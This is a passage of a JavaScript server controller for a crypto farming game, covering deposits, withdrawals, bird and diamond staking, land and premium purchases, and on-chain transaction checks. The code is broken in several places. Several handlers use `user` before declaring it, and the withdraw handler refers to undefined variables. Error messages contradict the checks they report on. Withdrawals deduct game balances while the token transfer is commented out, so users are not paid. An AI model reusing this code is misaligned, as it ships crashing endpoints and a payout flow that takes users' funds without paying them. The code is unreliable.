  let { walletAddress, amount, txID } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  amount = Number(amount);

  const historyTransition = await Transition.findOne({
    walletAddress,
    amount,
    txID,
  });
  if (historyTransition) {
    return;
  }

  //   writeLog(walletAddress, "Deposit", "", "REQUEST");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit", "REQUEST");

  //   writePriceLog(walletAddress, "Deposit", "Request", amount, txID);

  if (parseInt(amount) < 5) {
    // writeLog(
    //   walletAddress,
    //   "Deposit",
    //   "Deposit amount is less than 320BCS",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit", "Deposit amount is less than 320BCS");

    RESPONSE(res, 400, {}, "Deposit", "Deposit amount is less than 320BCS");
    return;
  }

  let blockNumber = 1;

  try {
    blockNumber = await checkTransaction(walletAddress, txID, amount);
    // writeLog(
    //   walletAddress,
    //   "Deposit",
    //   `request block number:${blockNumber}, user block number: ${user.blockNumber}`,
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit", `request block number:${blockNumber}, user block number: ${user.blockNumber}`);

    let errorType = "You sent scam transaction 1";
    if (blockNumber == 1) errorType = "You sent differnt amount of BUSD";
    if (blockNumber == 2) errorType = "You didn't sent BUSD Token";
    if (blockNumber == 3)
      errorType = "You didn't sent 1 BUSD(fee) to admin address";
    if (blockNumber == 4) errorType = "You sent scam transaction 2";

    if (blockNumber <= user.blockNumber) {
      RESPONSE(res, 400, {}, errorType);
      //   writePriceLog(walletAddress, "Withdraw(Error)", errorType, amount, txID);
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, errorType, "Withdraw(Error)");
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit", `${blockNumber}`);

      //   writeLog(walletAddress, "Deposit", `${blockNumber}`, "ERROR");
      return;
    }
  } catch (e) {
    RESPONSE(res, 400, {}, "check transaction error");
    // writeLog(walletAddress, "Deposit(check trx)", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit(check trx)", e);

    return;
  }

  try {
    const results = await User.findOneAndUpdate(
      { walletAddress },
      {
        $inc: { Drg: amount },
        blockNumber: blockNumber,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    let refAddress = user.parent;

    for (let i = 0; i < 3; i++) {
      let refAmount = 0;
      if (i == 0) refAmount = 5;
      if (i == 1) refAmount = 3;
      if (i == 2) refAmount = 1;

      if (refAddress == null || refAddress == "" || !refAddress) break;

      //   writeLog(
      //     walletAddress,
      //     "Deposit",
      //     "refUser:" + refAddress + " +" + refAmount,
      //     "SUCCESS"
      //   );
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit", "refUser:" + refAddress + " +" + refAmount,);

      //   writePriceLog(
      //     walletAddress,
      //     "Deposit",
      //     "refUser:" + refAddress + " +" + refAmount,
      //     amount
      //   );

      const refUser = await User.findOne({ walletAddress: refAddress });
      const res = await User.findOneAndUpdate(
        { walletAddress: refAddress },
        {
          $inc: {
            Drg: Math.floor((refAmount * amount) / 100),
            earned: Math.floor((refAmount * amount) / 100),
          },
        },
        {
          new: true,
          upsert: true, // Make this update into an upsert
        }
      );

      refAddress = res._doc.parent;
    }

    // writeLog(walletAddress, "Deposit", "Updated successfully", "SUCCESS");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit", "Updated successfully:" + amount);


    RESPONSE(res, 200, results._doc, "Deposit success!");
    const newTransition = new Transition({
      transitionId: 1,
      walletAddress,
      amount,
      txID,
    });
    await newTransition.save();
  } catch (e) {
    //writeLog(walletAddress, "Deposit", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Deposit", "ERROR:" + e);
    RESPONSE(res, 400, {}, "Deposit error!");
  }
});
export const meat = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const results = await User.findOne({ walletAddress });
  if (results._doc) RESPONSE(res, 200, results._doc, "success");
});
export const withdraw = asyncHandler(async (req, res) => {
  // let { walletAddress, amount, txID } = req.body;
  let { walletAddress, amount } = req.body;
  console.log("req---->", req.body)

  walletAddress = walletAddress.toLowerCase();

  //   writeLog(walletAddress, "Withdraw", "", "REQUEST");

  //   writePriceLog(walletAddress, "Withdraw", "Request", amount);

  const user = await User.findOne({ walletAddress });

  if (!user) {
    // writeLog(walletAddress, "Withdraw", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Withdraw", "User does not exist");

    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    // writeLog(
    //   walletAddress,
    //   "Withdraw",
    //   "You are banned because of scam action!",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Withdraw", "You are banned because of scam action");

    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    // writeLog(
    //   walletAddress,
    //   "Withdraw",
    //   "Only 5 accounts are available in a computer!",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw", "Only 5 accounts are available in a computer!");

    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }

  // if(txID=="") {
  //     writeLog(walletAddress, "Withdraw", "Please use platform withdraw","ERROR");
  //     RESPONSE(res, 400, {}, "Please use platform withdraw");
  //     return;
  // }

  //send User wallet to BCS token

  if (amount <= 0) {
    if (amount < 0) {
      await User.findOneAndUpdate(
        { walletAddress },
        {
          $inc: { isblock: 55 },
        },
        {
          new: true,
          upsert: true, // Make this update into an upsert
        }
      );
    }

    // writeLog(
    //   walletAddress,
    //   "Withdraw",
    //   "Drg amount is less than requested amount",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw", "Drg amount is less than requested amount");

    RESPONSE(
      res,
      400,
      {},
      amount == 0
        ? "Drg amount is less than requested amount"
        : "Don't try bad action, if you send again, you will be blocked"
    );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw(ERROR)", "Drg amount is less than requested amount:" + amount);

    return;
  }

  if (user.Drg <= 0) {
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw(ERROR)", "Drg amount is less than requested amount");

    RESPONSE(res, 400, {}, "Drg amount is less than requested amount");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw(ERROR)", "Drg amount is less than requested amount:" + amount);

    return;
  }

  if (user.Drg < amount) {
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw(ERROR)", "Drg amount is less than requested amount");

    RESPONSE(res, 400, {}, "Drg amount is less than requested amount");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw(ERROR)", "Drg amount is less than requested amount:" + amount);

    return;
  }

  let bcsAmount = Math.floor(amount / 10);
  // ------------------------ Start Update Database ------------------------
  try {
    user.Drg = user.Drg - amount;
    user.withdraws = user.withdraws + bcsAmount;
    user.save();
    writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Withdraw", "Updated database successfully:" + amount);

    RESPONSE(res, 200, {data: _doc}, "Success update swap!");
    // const newWithdraw = new Withdraw({
    //   walletAddress: walletAddress,
    //   amount: amount,
    //   txId: walletAddress,
    // });
    // await newWithdraw.save();

    // await sendToken(
    //   walletAddress,
    //   ADMIN_WALLET_ADDRESS[chainId],
    //   walletAddress,
    //   parseInt(amount / 10)
    // );
    // console.log("bscAmount12", bcsAmount)

    // const date = new Date(new Date().getTime() - 24 * 60 * 60 * 1000);

    // let results = await User.findOneAndUpdate(
    //   { walletAddress },
    //   {
    //     $inc: { Drg: -amount },
    //     $push: { withdraws: newWithdraw._id },
    //     lastWithdraw: new Date(),
    //   },
    //   {
    //     new: true,
    //     upsert: true, // Make this update into an upsert
    //   }
    // ).populate({ path: "withdraws", match: { createdAt: { $gte: date } } });
    // writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Withdraw", "Updated database successfully:" + amount);

    // RESPONSE(res, 200, results._doc, "Success update swap!");
  } catch (e) {
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw", "ERROR: " + e);

    RESPONSE(res, 400, {}, "Withdraw error!");
    console.log("SendToken Error2:", walletAddress, bcsAmount, e);
  }
  // ------------------------ End Update Database ------------------------
});

export const stakebird = asyncHandler(async (req, res) => {
  let { walletAddress, position } = req.body;

  //writeLog(walletAddress, "Stake Bird: ", position, "REQUEST");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Stake Bird: ", "REQUEST");
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    // writeLog(walletAddress, "Stake Bird", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Stake Bird", "User does not exist");

    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  if (!checkPositionStakable(user, position, "bird")) {
    // writeLog(
    //   walletAddress,
    //   "Stake Bird",
    //   "You are scammer, you are sending bad request",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Stake Bird", "You are scammer, you are sending bad request");

    RESPONSE(res, 400, {}, "You are scammer, you are sending bad request");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }

  if (user.Drg < 20) {
    // writeLog(
    //   walletAddress,
    //   "Stake Bird",
    //   "Drg amount is less than 20",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Stake Bird", "Drg amount is less than 20");

    RESPONSE(res, 400, {}, "Drg amount is less than 20");
    return;
  }

  try {
    let _stakedBirds = [...user.stakedBirds];

    if (_stakedBirds.length >= 48) {
      //   writeLog(walletAddress, "Stake Bird", "Scam request", "ERROR");
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Stake Bird", "Scam request");

      RESPONSE(res, 400, {}, "Scam request");
      return;
    }

    _stakedBirds.push({ position, staked_at: new Date() });

    let results = await User.findOneAndUpdate(
      { walletAddress },
      {
        Drg: user.Drg - 20,
        eggsRequest: user.eggsRequest + 1,
        stakedBirds: _stakedBirds,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    // writeLog(
    //   walletAddress,
    //   "Stake Bird",
    //   "Updated database successfully",
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Stake Bird", "Updated database successfully");

    RESPONSE(res, 200, results._doc, "Success stake bird!");
  } catch (e) {
    //writeLog(walletAddress, "Stake Bird", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Stake Bird", "ERROR:" + e);
    RESPONSE(res, 400, {}, "An error occurred in database update!");
  }
});

export const stakediamond = asyncHandler(async (req, res) => {
  let { walletAddress, position } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Swap meat", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Stake Diamond", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }
  let available = await Available.findOne({ user: walletAddress })
  if (!available) {
    available = new Available({ user: walletAddress })
    await available.save()
  }
  switch (position) {
    case 0:
      if (available.diamond1State.state === false) {
        available.diamond1State.state = true
        available.save()
        user.Drg = user.Drg - 20
        user.save()
        RESPONSE(res, 200, { data: user.Drg });
      }
      else {

        RESPONSE(res, 200, { data: user.Drg, });
      }
      break
    case 1:
      if (available.diamond2State.state === false) {
        available.diamond2State.state = true
        available.save()
        user.Drg = user.Drg - 20
        user.save()

        RESPONSE(res, 200, { data: user.Drg });
      }
      else {

        RESPONSE(res, 200, { data: user.Drg });
      }
      break
    case 2:
      if (available.diamond3State.state === false) {
        available.diamond3State.state = true
        available.save()
        user.Drg = user.Drg - 20
        user.save()
        RESPONSE(res, 200, { data: user.Drg });
      }
      else {

        RESPONSE(res, 200, { data: user.Drg });
      }
      break
  }

});

export const claimbird = asyncHandler(async (req, res) => {
  let { walletAddress, position } = req.body;

  //writeLog(walletAddress, "Claim Bird", position, "REQUEST");

  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    // writeLog(walletAddress, "Claim Bird", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Claim Bird", "User does not exist");

    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }

  // if(user.eggsRequest < 1) {
  //     writeLog(walletAddress, "Claim Bird", "Requested egg does not exist","ERROR");
  //     RESPONSE(res, 400, {}, "Requested egg does not exist");
  //     return;
  // }

  try {
    let _stakedBirds = [...user.stakedBirds];
    const data = _stakedBirds.find((elem) => elem.position == position);

    if (!data) {
      //writeLog(walletAddress, "Claim Bird", "Can't find requested position", "ERROR");
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Claim Bird", "Can't find requested position")
      RESPONSE(res, 400, {}, "Can't find requested position");
      return;
    }

    // check is time
    let expiredTime = new Date(data.staked_at);
    let curTime = new Date();

    if (expiredTime.getTime() + STAKE_TIMER * 1000 > curTime.getTime()) {
      //writeLog(walletAddress, "Claim Bird", "You have to wait yet", "ERROR");
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Claim Bird", "You have to wait yet")
      RESPONSE(res, 400, {}, "You have to wait yet");
      return;
    }

    _stakedBirds = _stakedBirds.filter(
      (item) => item && item.position != position
    );

    let results = await User.findOneAndUpdate(
      { walletAddress },
      {
        eggsRequest: user.eggsRequest - 1,
        eggs: user.eggs + 1,
        stakedBirds: _stakedBirds,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    //writeLog(walletAddress, "Claim Bird", "Updated database successfully", "SUCCESS");
    writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Claim Bird", "Updated database successfully");
    RESPONSE(res, 200, results._doc, "Success claim Bird!");
  } catch (e) {
    //writeLog(walletAddress, "Claim Bird", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Claim Bird", "ERROR:" + e);
    RESPONSE(res, 400, {}, "An error occurred in database update!");
  }
});

export const claimdiamond = asyncHandler(async (req, res) => {
  let { walletAddress, position } = req.body;
  walletAddress = walletAddress.toLowerCase();

  let available = await Available.findOne({ user: walletAddress })

  if (!available) {
    available = new Available({ user: walletAddress, sirenLevelupState: { state: false } });
    await available.save()
  }
  else {
    switch (position) {
      case 0:
        if (available.diamond1State.state === true) {
          const updatedAt = DateTime.fromJSDate(available.diamond1State.updatedAt);
          const now = DateTime.now();
          const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
          const result = 30 - diffInSeconds
          if (result <= 0) {
            let user = await User.findOne({ walletAddress })
            user.meat = user.meat + 30

            await user.save()

            available.diamond1State.state = false
            await available.save()
            writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
            RESPONSE(res, 200, { data: { meat: user.meat } });
            return
          }
        }
        break
      case 1:
        if (available.diamond2State.state === true) {
          const updatedAt = DateTime.fromJSDate(available.diamond2State.updatedAt);
          const now = DateTime.now();
          const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
          const result = 30 - diffInSeconds
          if (result <= 0) {
            let user = await User.findOne({ walletAddress })
            user.meat = user.meat + 30

            await user.save()
            available.diamond2State.state = false
            await available.save()
            writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
            RESPONSE(res, 200, { data: { meat: user.meat } });
            return
          }
        }
        break
      case 2:
        if (available.diamond3State.state === true) {
          const updatedAt = DateTime.fromJSDate(available.diamond3State.updatedAt);
          const now = DateTime.now();
          const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
          const result = 30 - diffInSeconds
          if (result <= 0) {
            let user = await User.findOne({ walletAddress })
            user.meat = user.meat + 30

            await user.save()

            available.diamond3State.state = false
            await available.save()
            writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
            RESPONSE(res, 200, { data: { meat: user.meat } });
            return
          }
        }
        break
    }

  }

  writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Claim Drg", "Scam Action")

  RESPONSE(res, 200, { data: false });
});

const checkTransaction = async (
  walletAddress,
  txID,
  tokenAmount,
  type = "BCS"
) => {
  //writeLog(walletAddress, "Check Transaction", "", "REQUEST");

  try {
    const web3 = new Web3(RPC_URL[chainId]);

    const txData = await web3.eth.getTransactionReceipt(txID);
    const txHist = await web3.eth.getTransaction(txID);

    let to = txHist.input.substring(34, 74);
    let data = txData.logs[0];
    let wei = web3.utils.hexToNumberString(data.data);

    let userAddress = txData.from.toLowerCase();
    let amount = web3.utils.fromWei(wei, type == "BCS" ? "gwei" : "ether");
    let adminWallet = ADMIN_WALLET_ADDRESS[chainId];
    let tokenAddress =
      type === "BCS"
        ? TOKEN_CONTRACT_ADDRESS[chainId].toLowerCase()
        : BUSD_CONTRACT_ADDRESS[chainId].toLowerCase();

    if (tokenAmount != amount) return 1;
    if (tokenAddress.toLowerCase() != data.address.toLowerCase()) return 2;
    if (to.toLowerCase() != adminWallet.substring(2).toLowerCase()) return 3;
    if (walletAddress.toLowerCase() != userAddress) return 4;

    return txHist.blockNumber;
  } catch (e) {
    //writeLog(walletAddress, "Check Transaction", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Check Transaction", "ERROR" + e);
    return 0;
  }
};

export const sendToken = async (walletAddress, from, to, rawAmount) => {
  const web3 = new Web3(RPC_URL[chainId]);

  try {
    const provider = new Provider(POOL_WALLET_PVK[chainId], RPC_URL[chainId]);
    const web3 = new Web3(provider);

    let tokenAddress = TOKEN_CONTRACT_ADDRESS[chainId];
    var tokenContract = new web3.eth.Contract(BCS_ABI, tokenAddress);
    let amount = web3.utils.toWei(rawAmount.toString(), "gwei");

    const tx = tokenContract.methods.transfer(to, amount);
    const gas = await tx.estimateGas({ from: from });
    const gasPrice = await web3.eth.getGasPrice();
    const data = tx.encodeABI();
    const nonce = await web3.eth.getTransactionCount(from);

    const signedTx = await web3.eth.accounts.signTransaction(
      {
        to: tokenAddress,
        data,
        gas,
        gasPrice,
        nonce,
        chainId,
      },
      POOL_WALLET_PVK[chainId]
    );

    const receipt = await web3.eth.sendSignedTransaction(
      signedTx.rawTransaction
    );
    return receipt;
  } catch (e) {
    // writeLog(
    //   walletAddress,
    //   "SendToken",
    //   "An error is occurred while sending BCS",
    //   "ERROR"
    // );
    // writePriceLog(
    //   walletAddress,
    //   "SendToken",
    //   "An error is occurred while sending BCS",
    //   rawAmount
    // );
    // writeLog(walletAddress, "SendToken", e, "ERROR");
    // writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "SendToken", "An error is occurred while sending BCS");
    console.log("SendToken Error:", walletAddress, rawAmount, e);
  }

  return true;
};

export const buyLand = asyncHandler(async (req, res) => {
  let { walletAddress, amount, txID, position } = req.body;

  //writeLog(walletAddress, "Buy Land", "", "REQUEST");
  //writePriceLog(walletAddress, "Buy Land", "Request", amount, txID);
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Land", "Request:" + amount);
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Buy Land", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Buy Land", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (amount <= 0) {
    // writeLog(
    //   walletAddress,
    //   "Buy Land",
    //   "Requested amount is less than zero",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Land", "Requested amount is less than zero");
    RESPONSE(res, 400, {}, "Requested amount is less than zero");
    return;
  }

  let blockNumber = 1;
  try {
    console.log(walletAddress, txID, LAND_COST[position - 1], "BCS");
    blockNumber = await checkTransaction(
      walletAddress,
      txID,
      LAND_COST[position - 1],
      "BCS"
    );
    // writeLog(
    //   walletAddress,
    //   "Buy Land",
    //   `request block number:${blockNumber}, user block number: ${user.blockNumber}`,
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Land", `request block number:${blockNumber}, user block number: ${user.blockNumber}`);
    let errorType = "";
    if (blockNumber == 1) errorType = "Differnt amount";
    if (blockNumber == 2) errorType = "Differnt address";
    if (blockNumber == 3) errorType = "Differnt admin";
    if (blockNumber == 4) errorType = "You sent scam transaction";

    if (blockNumber <= user.blockNumber) {
      RESPONSE(res, 400, {}, errorType);
      // writePriceLog(walletAddress, "Withdraw(Error)", errorType, amount, txID);
      // writeLog(walletAddress, "Buy Land", `${blockNumber}`, "ERROR");
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Land", "ERROR" + `${blockNumber}`);
      return;
    }
  } catch (e) {
    RESPONSE(res, 400, {}, "check transaction error");
    //writeLog(walletAddress, "Buy Land", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Land", "ERROR" + e);
    return;
  }

  try {
    let _opendPlace = [...user.opendPlace];
    _opendPlace = _opendPlace.filter(
      (item) => item && item.position != position
    );
    _opendPlace.push(position);

    let results = await User.findOneAndUpdate(
      { walletAddress },
      {
        opendPlace: _opendPlace,
        blockNumber: blockNumber,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    // writeLog(walletAddress, "Buy Land", "Updated successfully", "SUCCESS");
    // writePriceLog(walletAddress, "Buy Land", "Success", amount);
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Land", "Updated successfully" + amount);

    RESPONSE(res, 200, results._doc, "Buy Land success!");
  } catch (e) {
    //writeLog(walletAddress, "Buy Land", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Land", "ERROR:" + e);
    RESPONSE(res, 400, {}, "Buy Land error!");
  }
});

export const getPremium = asyncHandler(async (req, res) => {
  let { walletAddress, amount, txID } = req.body;

  // writeLog(walletAddress, "Premium", "", "REQUEST");
  // writePriceLog(walletAddress, "Buy Premium", "Request", amount, txID);
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Premium", "REQUEST:" + amount);
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Premium", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Buy Premium", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (amount <= 0) {
    // writeLog(
    //   walletAddress,
    //   "Premium",
    //   "Requested amount is less than zero",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Premium", "Requested amount is less than zero");
    RESPONSE(res, 400, {}, "Requested amount is less than zero");
    return;
  }
  let blockNumber = 1;
  try {
    blockNumber = await checkTransaction(
      walletAddress,
      txID,
      PREMIUM_COST,
      "BUSD"
    );
    // writeLog(
    //   walletAddress,
    //   "Premium",
    //   `request block number:${blockNumber}, user block number: ${user.blockNumber}`,
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Premium", `request block number:${blockNumber}, user block number: ${user.blockNumber}`);
    let errorType = "";
    if (blockNumber == 1) errorType = "Differnt amount";
    if (blockNumber == 2) errorType = "Differnt address";
    if (blockNumber == 3) errorType = "Differnt admin";
    if (blockNumber == 4) errorType = "You sent scam transaction";

    if (blockNumber <= user.blockNumber) {
      RESPONSE(res, 400, {}, errorType);
      // writePriceLog(walletAddress, "Withdraw(Error)", errorType, amount, txID);
      //writeLog(walletAddress, "Premium", `${blockNumber}`, "ERROR");
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Premium", "ERROR:" + `${blockNumber}`);
      return;
    }
  } catch (e) {
    RESPONSE(res, 400, {}, "check transaction error");
    //writeLog(walletAddress, "Premium", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Premium", "ERROR:" + e);
    return;
  }

  try {
    let results = await User.findOneAndUpdate(
      { walletAddress },
      {
        premium: new Date(),
        blockNumber: blockNumber,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    // writeLog(walletAddress, "Premium", "Updated successfully", "SUCCESS");
    // writePriceLog(walletAddress, "Buy Premium", "Success", amount);
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Premium", "Updated successfully" + amount);

    RESPONSE(res, 200, results._doc, "Premium success!");
  } catch (e) {
    // writeLog(walletAddress, "Premium", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Premium", "ERROR:" + e);
    RESPONSE(res, 400, {}, "Premium error!");
  }
});


export const getMiningStatus = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Buy Mining", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Buy Mining", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }
  if (user.Drg > 500) {

    user.Drg = user.Drg - 500;
    user.miningStatus = true;
    user.save();
    RESPONSE(res, 200, { data: user }, "Successfully");
  }
})


export const buyMining = asyncHandler(async (req, res) => {
  let { walletAddress, amount, txID, type } = req.body;

  // writeLog(walletAddress, "Buy Mining", type, "REQUEST");
  // writePriceLog(
  //   walletAddress,
  //   "Buy Mining Module",
  //   `Request ${type}`,
  //   amount,
  //   txID
  // );
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Mining", `Request ${type}:` + amount);
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Buy Mining", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Buy Mining", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (amount <= 0) {
    // writeLog(
    //   walletAddress,
    //   "Buy Mining",
    //   "Requested amount is less than zero",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Mining", "Requested amount is less than zero");
    RESPONSE(res, 400, {}, "Requested amount is less than zero");
    return;
  }
  let blockNumber = 1;
  try {
    if (type != "gold") {
      blockNumber = await checkTransaction(
        walletAddress,
        txID,
        MINING[type].COST,
        MINING[type].TOKEN
      );
      console.log("blockNumber:", blockNumber);
      // writeLog(
      //   walletAddress,
      //   "Buy Mining",
      //   `request block number:${blockNumber}, user block number: ${user.blockNumber}`,
      //   "SUCCESS"
      // );
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Mining", `request block number:${blockNumber}, user block number: ${user.blockNumber}`);
      let errorType = "";
      if (blockNumber == 1) errorType = "Differnt amount";
